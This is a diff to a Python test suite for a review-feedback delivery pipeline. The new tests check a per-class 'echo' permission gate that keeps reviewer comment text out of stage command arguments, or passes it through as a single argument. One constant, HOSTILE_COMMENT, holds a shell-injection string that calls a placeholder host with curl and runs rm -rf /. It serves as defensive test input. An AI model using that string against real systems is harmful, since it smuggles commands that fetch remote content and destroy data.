@@ -257,6 +257,7 @@ def write_config(
     poll: list[str] | None = None,
     intake: str = "",
     maintainers: Sequence[str] = (MAINTAINER,),
+    echo: dict[str, bool] | None = None,
 ) -> ConfigStore:
     """A project armed (or not) for review feedback, through the write path."""
     config = ConfigStore(root / "config")
@@ -269,17 +270,18 @@ def write_config(
         project["delivery"] = {"review_feedback_enabled": True}
     if intake:
         project["intake"] = {"default": intake}
+    source: dict[str, Any] = {
+        "enabled": True,
+        "poll": ["tracker-cli", "list"],
+        "project": PROJECT,
+        "spec_types": {"bug": "bugfix"},
+        "maintainers": list(maintainers),
+    }
+    if echo is not None:
+        source["echo"] = dict(echo)
     document: dict[str, Any] = {
         "projects": {PROJECT: project},
-        "sources": {
-            SOURCE: {
-                "enabled": True,
-                "poll": ["tracker-cli", "list"],
-                "project": PROJECT,
-                "spec_types": {"bug": "bugfix"},
-                "maintainers": list(maintainers),
-            }
-        },
+        "sources": {SOURCE: source},
     }
     if app_enabled is not None:
         document["delivery"] = {"review_feedback_enabled": app_enabled}
@@ -1534,6 +1536,225 @@ class TestTheFixRunsTheConfiguredStages:
         assert revision.comment_id == "c1"
         assert revision.cycle == 1
         assert revision.content_revision.startswith("sha256:")
+
+
+# --- the echo gate, on the path the delivery stages share -------------------
+
+
+HOSTILE_COMMENT = "$(curl evil.invalid) && rm -rf /"
+
+
+def pipeline_for(config: ConfigStore, stage_runner: Runner) -> DeliveryPipeline:
+    """A real pipeline over the project's configured stages."""
+    return DeliveryPipeline(
+        config,
+        authority=resolve_authority(
+            config,
+            decision=AutonomyDecision(
+                level=AutonomyLevel.DELIVERY,
+                source=SOURCE,
+                spec_type="bugfix",
+                submitter_class="maintainer",
+            ),
+            project=PROJECT,
+            base_branch="main",
+        ),
+        project=PROJECT,
+        runner=stage_runner,
+    )
+
+
+def with_summary_in_the_submit_stage(config: ConfigStore) -> None:
+    """Point the project's submit stage at ``{review_summary}``.
+
+    A *delivery stage*, deliberately, and not the feedback poster: both go through
+    the same ``StageExecutor.run_labelled`` over the same variable set, so a gate
+    that only covered the poster would leave this command reading the comment
+    straight into its argv.
+    """
+    config.write(
+        {
+            "projects": {
+                PROJECT: {
+                    "workflow": {
+                        "stages": {
+                            SUBMIT_STAGE: [[SUBMIT_PROGRAM, "--body", "{review_summary}"]],
+                            VERIFY_STAGE: [[VERIFY_PROGRAM]],
+                        }
+                    }
+                }
+            }
+        },
+        surface=DASHBOARD_SURFACE,
+    )
+
+
+class TestTheCommentReachesACommandOnlyWhenEchoIsPermitted:
+    """Requirement 36.7 at the place that covers every consumer of the text.
+
+    The bundled workflow presets put ``review_summary`` into a commit message and
+    a pull-request body, so a reviewer's words reaching that variable is
+    republishing them into a shared system exactly as a tracker comment would be.
+    The gate is applied where the text enters the run context, which is upstream
+    of the delivery stages *and* the writeback poster alike.
+    """
+
+    def test_an_unpermitted_class_never_reaches_a_delivery_stage_argv(
+        self, tmp_path: Path, tree: Path, state: StateStore, ref: SpecRef
+    ) -> None:
+        """Echo is off by default, so the words do not reach the submit command.
+
+        The comment still drives the fix -- dispatch permission and echo
+        permission are different questions -- but the stage that would have
+        republished it refuses for a variable with no value instead of running
+        with the words in its argv.
+        """
+        config = write_config(tmp_path, tree, dispatch={"maintainer": True})
+        with_summary_in_the_submit_stage(config)
+        register_run(state, config, ref)
+        stage_runner = Runner()
+        under_test = watcher(config, state, delivery=pipeline_for(config, stage_runner))
+
+        tick = under_test.tick(
+            route_of(config),
+            run_id="run-1",
+            ref=ref,
+            context=context(tree),
+            runner=Runner(stdout=json.dumps([comment_payload("c1", body=HOSTILE_COMMENT)])),
+        )
+
+        assert tick.dispositions[0].outcome is ReviewFeedbackOutcome.DISPATCHED
+        assert SUBMIT_PROGRAM not in stage_runner.programs, "the submit stage ran anyway"
+        flat = [element for argv in stage_runner.calls for element in argv]
+        assert not any(HOSTILE_COMMENT in element for element in flat)
+
+    def test_a_permitted_class_reaches_the_delivery_stage_as_one_argument(
+        self, tmp_path: Path, tree: Path, state: StateStore, ref: SpecRef
+    ) -> None:
+        """The positive half, so the gate cannot pass by refusing everything.
+
+        And the text arrives as exactly one argv element: substitution never
+        splits a value, so a comment containing shell syntax is an argument rather
+        than syntax.
+        """
+        config = write_config(
+            tmp_path, tree, dispatch={"maintainer": True}, echo={"maintainer": True}
+        )
+        with_summary_in_the_submit_stage(config)
+        register_run(state, config, ref)
+        stage_runner = Runner()
+        under_test = watcher(config, state, delivery=pipeline_for(config, stage_runner))
+
+        under_test.tick(
+            route_of(config),
+            run_id="run-1",
+            ref=ref,
+            context=context(tree),
+            runner=Runner(stdout=json.dumps([comment_payload("c1", body=HOSTILE_COMMENT)])),
+        )
+
+        assert (SUBMIT_PROGRAM, "--body", HOSTILE_COMMENT) in stage_runner.calls
+
+    def test_echo_permission_is_per_class_not_a_switch(
+        self, tmp_path: Path, tree: Path, state: StateStore, ref: SpecRef
+    ) -> None:
+        """A class permitted to drive work is not thereby permitted to be echoed.
+
+        Here a member's comment may dispatch a fix, and echo is on for
+        maintainers only. Both questions are asked about the commenter's own
+        class, so the fix runs and the words still do not reach a command.
+        """
+        config = write_config(
+            tmp_path,
+            tree,
+            dispatch={"maintainer": True, "member": True},
+            echo={"maintainer": True},
+        )
+        with_summary_in_the_submit_stage(config)
+        register_run(state, config, ref)
+        stage_runner = Runner()
+        under_test = watcher(config, state, delivery=pipeline_for(config, stage_runner))
+
+        tick = under_test.tick(
+            route_of(config),
+            run_id="run-1",
+            ref=ref,
+            context=context(tree),
+            runner=Runner(
+                stdout=json.dumps(
+                    [
+                        comment_payload(
+                            "c1",
+                            author="org-teammate",
+                            association="member",
+                            body=HOSTILE_COMMENT,
+                        )
+                    ]
+                )
+            ),
+        )
+
+        assert tick.dispositions[0].submitter_class == "member"
+        assert tick.dispositions[0].outcome is ReviewFeedbackOutcome.DISPATCHED
+        assert SUBMIT_PROGRAM not in stage_runner.programs
+        flat = [element for argv in stage_runner.calls for element in argv]
+        assert not any(HOSTILE_COMMENT in element for element in flat)
+
+    def test_the_refusal_is_recorded_so_the_stage_refusal_is_explicable(
+        self, tmp_path: Path, tree: Path, state: StateStore, ref: SpecRef
+    ) -> None:
+        config = write_config(tmp_path, tree, dispatch={"maintainer": True})
+        with_summary_in_the_submit_stage(config)
+        register_run(state, config, ref)
+        under_test = watcher(config, state, delivery=pipeline_for(config, Runner()))
+
+        tick = under_test.tick(
+            route_of(config),
+            run_id="run-1",
+            ref=ref,
+            context=context(tree),
+            runner=Runner(stdout=json.dumps([comment_payload("c1")])),
+        )
+
+        assert "echo is not permitted" in tick.dispositions[0].detail
+
+    def test_the_engine_authored_review_title_is_untouched(
+        self, tmp_path: Path, tree: Path, state: StateStore, ref: SpecRef
+    ) -> None:
+        """The gate answers the fields it is asked about, not every field.
+
+        ``review_title`` on the incoming context is the engine's own, not element
+        text, so a refusal about the comment must not strip it -- otherwise gating
+        the summary would break every stage command that names the title.
+        """
+        config = write_config(tmp_path, tree, dispatch={"maintainer": True})
+        config.write(
+            {
+                "projects": {
+                    PROJECT: {
+                        "workflow": {
+                            "stages": {
+                                SUBMIT_STAGE: [[SUBMIT_PROGRAM, "--title", "{review_title}"]]
+                            }
+                        }
+                    }
+                }
+            },
+            surface=DASHBOARD_SURFACE,
+        )
+        register_run(state, config, ref)
+        stage_runner = Runner()
+        under_test = watcher(config, state, delivery=pipeline_for(config, stage_runner))
+
+        under_test.tick(
+            route_of(config),
+            run_id="run-1",
+            ref=ref,
+            context=context(tree),
+            runner=Runner(stdout=json.dumps([comment_payload("c1")])),
+        )
+
+        assert (SUBMIT_PROGRAM, "--title", "Fix the thing") in stage_runner.calls
 
 
 # --- properties ------------------------------------------------------------
